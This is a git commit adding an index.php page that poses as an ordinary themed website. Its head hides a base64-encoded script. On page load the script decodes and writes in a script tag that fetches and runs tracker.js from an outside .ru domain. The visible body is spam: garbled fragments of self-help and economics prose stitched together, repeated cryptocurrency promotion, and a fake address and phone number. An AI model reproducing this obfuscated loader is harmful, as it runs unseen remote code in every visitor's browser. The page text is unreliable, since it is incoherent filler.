5311233e671da342a23320b88594c9a42a5fcfde
mzognsbp <81928725+mzognsbp@users.noreply.github.com>
2021-04-04 22:27:45 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9sMnZrd2Jyb2IxMDQ2bzJhNjUiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>The Win / Win atmosphere has significantly increased the numb</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="l9590oyv21gt5zx3">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="kighexyoj4ywroajuqaos7vo">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>The Win / Win atmosphere has significantly increased the numb</h1>
+	</section>
+
+
+	<section class="our-work" class="x2vfd30d2h8wuozr96dd3t6">
+		<h3 class="title">In an effort to protect themselves from this, they </h3>
+		<p>Patent law deals with industrial property, i.e. China Official Coin: Singapore, South Korea, Malaysia.  In their lives, they experience only very weak, minor manifestations of synergy.Perhaps they have memories of some unusual creative achievements, say, in athletics, when for some time they were influenced by the spirit of a united team.  Product a expresses its value in product c.  We were able to create a strong complementary team and build true friendship, which significantly increased the efficiency of our joint work.  But the level of trust in you is so low, and the communication process is so closed, formal and unfulfilling that the son simply does not want to open up to your advice.  Forced - such unemployment, which occurs in a fixed wage.  Spouses get what they both want and at the same time develop their relationship.  His attitude showed that he genuinely cares about my comfort and well-being.  Internal security: Your sense of security is changeable, unstable, unstable. </p>
+		<hr>
+
+		<ul class="grid" class="tx4ca43pqmn4qq4jv9e">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="x2vfd30d2h8wuozr96dd3t6">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>20.  As Eleanor Roosevelt [12] said: "Nobody can hurt you without your consent." Or, in the words of Gandhi [13]: “It is impossible to </td>
+    <td>They feel that they are showing weakness, and are afraid that others will take advantage of this and gain an advantage.  - Pr</td>
+    <td>With the time management matrix in mind, return now to your answers to the questions at the beginning of this chapter.  Gold becomes the unive</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>- Did you have fun? - Yes.  It is possible that the most valuable contribution you can make is that you simply listen to it without criticism, sermons,</td>
+    <td>As you know, an imperfect competitor, striving to maintain a high level of prices, is interested in creating.  The stories of American soldiers capt</td>
+    <td>However, in the end, the commissioning of more and more capacities will lead to an increase in long-term average costs.  Consequently</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>I lay down next to him to discuss the impressions of the evening.  We have hung our family's mission on the wall to make </td>
+    <td>But there are many other programs that are nothing more than a waste of time and intelligence, and many that, if we allow them, affe</td>
+    <td>This is why Habits 1, 2, and 3 in the following chapters focus on self-mastery.  Another powerful way to sharpen your smart saw is through writing.  The stimulatin</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="l9590oyv21gt5zx3">
+		<h3 class="title">If P and RS are in balance, then your daug</h3>
+		<p>Consequently, the functions of state bodies are located between the functions of the state and its practical activities.  1.  Such delegation is time-consuming at first, but the costs are very effective.  Creation of equal economic conditions for different types of commodity owners, the introduction of competitive principles in their activities determines the objective need for the assessment and protection of intellectual property.  The manufacturer does everything necessary to get the desired result, to have golden eggs.  It involves the use in our relations with other people of all the unique properties of a person - self-awareness, imagination, conscience and independent will.  Changes in the prices of other products can also shift the supply curve of a product.A drop in the price of wheat could encourage the farmer to grow and sell more corn at each possible price.  But the only result of your efforts will bethat you will find yourself in the wrong place even faster.  5.  They don't disappear the next day.  PRICE DISCRIMINATION Price discrimination is selling at more than one price when price differences are not justified by differences in costs. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="kighexyoj4ywroajuqaos7vo" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="x2vfd30d2h8wuozr96dd3t6">
+		<h3 class="title">Easier to do it yourself.  Others, with or without an open agre</h3>
+		<p>This role was played by skins, grain, pieces of metal, cattle. Chinese Coin: Sales Open In Today.  In this system, there is no control monopoly that limits the manufacturer's functions.  Realization of the meaning of life comes from within.  The activity of an enterprise is always associated with a certain risk.  You carefully consider the product or service you intend to provide based on your market goals. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="tx4ca43pqmn4qq4jv9e" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="tx4ca43pqmn4qq4jv9e" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="l9590oyv21gt5zx3">
+		<h3 class="title">The paradigm of determinism is the result of studyi</h3>
+		<p>In the event that these current costs take the form of periodic payments, they refer to explicit monetary fixed costs.  If you are guided by principles, you will try to set aside emotions,caused by the situation and other factors that may affect you, and evaluate your options.  “I work as a nurse for the grumpiest and most ungrateful person you can imagine.  My heart was filled with deep sympathy for him.  First: your development will be evolutionary, but the final result will be revolutionary.  Knowledge is a theoretical paradigm that determines what to do and why.  For many people, it is this skill — strive to understand first — that becomes the most impressive and most rapidly applicable of the seven skills.  Explicit costs include wages paid to workers, managers' salaries, commissions paid to trading firms, payments to banks and other financial service providers, legal advice fees, travel expenses, etc .; 2) implicit (internal, implicit) costs.  Principles are like beacons.  Therefore, the curve is very elastic.  Plus, as you openly and honestly share what you’ve learned with others, you’ll be surprised to find that negative labels and prejudices that someone might associate with you disappear.  I devote my time, ability and resources to fulfilling my Mission.  Better than compromise. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="kighexyoj4ywroajuqaos7vo" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="x2vfd30d2h8wuozr96dd3t6">
+		<h3 class="title">Defining Roles and Goals Of course, the lo</h3>
+		<p>Many people have never experienced even mild synergy in their family life or in other relationships.  For human resources, the P / PC balance is equally fundamental.  When we read the lines of our family Mission about showing love for each other, about maintaining order, about independence associated with responsibility, about cooperation, mutual assistance, meeting needs, about developing talents, about showing interest in each other's abilities and about serving others, - this gives us a yardstick by which we assess how our affairs correspond to what we consider most important to our family.  We are able to write the Statement of Personal Mission, a personal constitution.  But I was already convinced of the value of the Win / Win principle.  There is a category of people who are registered as unemployed in accordance with the requirements of income redistribution programs.  - It goes! - Now guess who will evaluate your work.  Reactive people, on the other hand,waste their efforts in the Circle of Concerns.  This is a long-term process that requires serious commitment to oneself. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="tx4ca43pqmn4qq4jv9e" class="title">Empathic listening in itself is a tremendous contribution to th</h3>	
+		<p>LAND MARKET One of the main factors of production is land. China Official Coin: Singapore, South Korea, Malaysia.  Some time later, in the office of the head of the department, this teacher began his address with the following words: - Let me first make sure that I understand correctly the tasks you are facing and your doubts about my request for funding.  The left operates with words, the right with images; the left one deals with parts and features, the right one deals with the whole and the connections between separate parts.  And then something phenomenal starts happening.  From the very beginning, we treated each other so caringly and sensitively, we tried so hard to support each other that this greatly facilitated for each of us the difficult path to discovering ourselves.  They communicate until they come to a solution that they both like.  But by taking up strength, you create weakness.  You are my boss.  He's making a lot of money.  - I put you in an awkward position in the presence of your friends.  But please don't tell your mom, okay? - You do not wanthow to say ...) - Well, more or less ...  Try to define the very essence of the family relationship you would like to create,for many years, every day, making a certain effort for this.  You can adapt to new conditions and be flexible. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="l9590oyv21gt5zx3">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="kighexyoj4ywroajuqaos7vo"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="x2vfd30d2h8wuozr96dd3t6"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="tx4ca43pqmn4qq4jv9e"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>8925 Jake Forge, Apt. 566, 97716, Marjolainemouth, Oklahoma, United States</p>
+		<p>Phone number: +541(6948)419-48-59828</p>
+	</footer>
+
+</body>
+
+</html>
